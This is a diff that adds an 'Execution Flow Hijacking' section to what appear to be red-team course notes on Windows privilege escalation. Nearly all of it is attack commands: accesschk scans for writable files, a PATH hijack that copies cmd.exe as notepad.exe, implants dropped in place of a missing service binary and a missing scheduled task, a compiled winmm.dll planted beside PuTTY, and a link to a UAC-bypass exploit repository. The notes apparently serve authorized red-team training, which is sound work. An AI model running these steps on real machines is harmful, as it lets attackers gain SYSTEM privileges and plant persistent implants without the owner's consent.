@@ -108,4 +108,65 @@ C:\> reg add HKLM\SYSTEM\CurrentControlSet\services\IKEEXT /v ImagePath /t REG_E
 
 ### Execution Flow Hijacking
 
+- Search for files with weak permissions
+
+```
+C:\> c:\rto\tools\si\accesschk.exe -accepteula -wus "Users" c:\*.* > c:\rto\fld-usr.txt
+C:\> c:\rto\tools\si\accesschk.exe -accepteula -wus "Authenticated Users" c:\*.* > c:\rto\fld-authusr.txt
+```
+
+- Exploit the PATH variable
+
+```
+C:\> reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment"
+C:\> icacls c:\rto\bin
+C:\> copy c:\windows\system32\cmd.exe c:\rto\bin\notepad.exe
+
+C:\> del c:\rto\bin\notepad.exe
+```
+
+- Exploit a missing service
+
+```
+C:\> c:\RTO\Tools\si\autorunsc64.exe -a s | more
+C:\> sc query AdobeUpdate
+C:\> sc qc AdobeUpdate
+C:\> copy c:\RTO\LPE\implant\implantsrv.exe c:\rto\bin\AdobeUpdate.exe
+
+C:\> sc stop AdobeUpdate
+C:\> sc start AdobeUpdate
+
+C:\> del c:\rto\bin\AdobeUpdate.exe
+```
+
+- Exploit a missing scheduled task
+
+```
+C:\> c:\RTO\Tools\si\autorunsc64.exe -a t | more
+C:\> schtasks /query /tn OneDriveChk /xml
+
+C:\> wmic useraccount where sid='S-1-5-21-3461203602-4096304019-2269080069-1003' get name
+
+C:\> copy c:\RTO\LPE\implant\implant.exe C:\RTO\bin\OneDriveChk.exe
+
+C:\> del C:\RTO\bin\OneDriveChk.exe
+```
+
+- Hijack a DLL
+
+```
+C:\> cd c:\RTO\LPE\DLL-hijack
+C:\> compile.bat
+C:\> copy c:\RTO\LPE\DLL-hijack\winmm.dll c:\RTO\Tools\putty\
+
+C:\> del c:\RTO\Tools\putty\winmm.dll
+```
+
+- Bypass UAC
+
+```
+Repo with up-to-date UAC bypass exploits:
+https://github.com/hfiref0x/UACME
+```
+
 ### Getting SYSTEM
